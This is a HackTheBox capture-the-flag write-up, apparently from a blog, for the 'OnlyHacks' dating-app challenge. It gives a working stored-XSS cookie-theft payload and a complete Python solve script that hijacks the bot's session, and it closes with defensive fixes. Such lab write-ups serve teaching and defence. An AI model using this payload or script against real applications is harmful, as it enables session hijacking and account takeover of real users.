---
title: "OnlyHacks"
date: 2026-09-17 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, xss, socket.io, session-hijacking, cookie-theft]
description: "A Valentine's dating app matches you with an always-online bot. The chat client renders incoming messages as raw HTML, so a stored XSS fires in the bot's browser — and because the bot's session cookie isn't HttpOnly and the chat routes by room, you make the bot's own socket hand you its cookie, then read the flag it can see."
---

## Overview

`OnlyHacks` is a Very Easy HackTheBox **Web** challenge built around a Valentine's-themed dating app. You register, swipe-match with an always-online "impostor" bot named **Renata**, and chat with her over Socket.IO. The chat client drops every incoming message straight into the page as raw HTML, so anything you send executes in the recipient's browser — a textbook [stored cross-site scripting](https://cwe.mitre.org/data/definitions/79.html) ([CWE-79](https://cwe.mitre.org/data/definitions/79.html)) flaw. The bot is the only account that can see the flag, so the whole challenge is: pop XSS in the bot's session, steal her cookie, impersonate her, read the flag.

## The technique

The chat page renders messages it receives with no escaping at all:

```js
socket.on('message', function (msg) {
  $('div.msg_history').append(`... <p>${msg.message}</p> ...`)   // raw HTML sink
})
```

Renata is a headless bot that reads her messages, so a message body containing HTML/JS runs in **her** browser — blind XSS. Two design mistakes turn that into full account takeover:

1. The login cookie is set **without `HttpOnly`** (`Set-Cookie: session=...; Path=/`), so `document.cookie` is readable from JavaScript.
2. The server routes Socket.IO `outgoing` events by the **joined room**, not by a trusted identity (the page template even leaks `rid:'None'` yet messages still route correctly). That means the bot's own page can be made to emit a message back into the room you share.

So instead of exfiltrating to an external listener, you make the victim's *own* live `socket` send her cookie back to you — fully self-contained, no `webhook.site`, no out-of-band callback, nothing for an egress filter to catch.

The payload, sent as a normal chat message:

```html
<img src=x onerror="socket.emit('outgoing',{timestamp:0,sender_username:'x',sender_id:0,message:document.cookie,rid:'6'})">
```

When Renata's browser renders it, the broken image fires `onerror`, her socket emits `document.cookie` into the shared room, and it arrives back to you as an ordinary incoming `message`.

## Solution

The flow is: register (the `profile-picture` upload field is required, or it flashes *"Please fill all fields"*) and log in, `POST /like` with `liked-person=Renata` to create the match room (`rid=6`), join that room over Socket.IO, send the payload, and catch the cookie that comes back. Then swap your `session` cookie for hers and `GET /chat/` — her conversation with another match (Dimitris) shows the flag as the last message.

One wrinkle worth noting: the bundled `python-socketio` is pinned to an Engine.IO v3 client and returns HTTP 400 against this Engine.IO v4 server, so `solve.py` speaks the Socket.IO v5 framing by hand over `websocket-client` (`40` connect, `42[...]` events, `2`/`3` ping-pong).

`solve.py`:

```python
#!/usr/bin/env python3
import sys, time, json, re, requests, websocket

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://TARGET:PORT"
WS = BASE.replace("http://", "ws://").replace("https://", "wss://") + "/socket.io/?EIO=4&transport=websocket"
U, P = f"pwn{int(time.time())%100000}", "Passw0rd!"

s = requests.Session()
png = b"\x89PNG\r\n\x1a\n" + b"\x00" * 16            # profile-picture field is required
s.post(f"{BASE}/register", files={"profile-picture": ("a.png", png, "image/png")},
       data={"username": U, "password": P, "email": "a@a.com", "age": "25",
             "bio": "hi", "user-gender": "Male", "interested-gender": "Female"})
s.post(f"{BASE}/login", files={"username": (None, U)}, data={"password": P})
my_sess = s.cookies.get("session")
s.post(f"{BASE}/like", files={"liked-person": (None, "Renata")})    # match the bot -> rid=6

payload = ('<img src=x onerror="socket.emit(\'outgoing\','
           '{timestamp:0,sender_username:\'x\',sender_id:0,'
           'message:document.cookie,rid:\'6\'})">')

cookie_hdr = "; ".join(f"{c.name}={c.value}" for c in s.cookies)
ws = websocket.create_connection(WS, header=[f"Cookie: {cookie_hdr}"], timeout=30)
ws.recv(); ws.send("40"); ws.recv()                 # engine.io open -> socket.io connect
ws.send('42["join-chat",{"rid":"6"}]'); time.sleep(1)
ws.send("42" + json.dumps(["outgoing", {"timestamp": int(time.time()),
        "sender_username": U, "sender_id": 0, "message": payload, "rid": "6"}]))

bot = None
end = time.time() + 30
while time.time() < end and not bot:
    f = ws.recv()
    if f == "2": ws.send("3"); continue            # ping -> pong
    if f.startswith("42"):
        _, data = json.loads(f[2:])
        body = data.get("message", "") if isinstance(data, dict) else str(data)
        if "session=" in body and my_sess not in body:
            bot = re.search(r"session=([^;\s]+)", body).group(1)
ws.close()

bs = requests.Session(); bs.cookies.set("session", bot)   # impersonate the bot
flag = re.search(r"HTB\{[^}]+\}", bs.get(f"{BASE}/chat/").text)
print("FLAG:", flag.group(0) if flag else "not found")
```

Running it against the live instance steals Renata's cookie (it decodes to `{"user":{"id":1,"username":"Renata"}}`), loads her chat, and prints the flag: `HTB{...}`.

## Why it worked

Untrusted input reached a privileged viewer's DOM unescaped, and the session token was reachable from script. Classic stored-XSS-to-bot, escalated to session hijack. The neat part is the exfil path: because outbound chat events are routed by room rather than by an authenticated identity, the victim's own WebSocket becomes the channel that delivers her cookie back to the attacker — no external infrastructure, immune to egress filtering.

## Fix / defense

- **Escape on output** — insert message text with `.text(msg.message)` or an auto-escaping template, never string-concatenated into `.append()` / `innerHTML`.
- **`HttpOnly` + `Secure` + `SameSite`** on the session cookie so XSS can't read it.
- A **Content-Security-Policy** (`script-src 'self'`, no inline) blocks the inline `onerror` handler outright.
- Authorize server-side actions by identity, not just by a joined room, so a hijacked socket can't relay messages on another user's behalf.
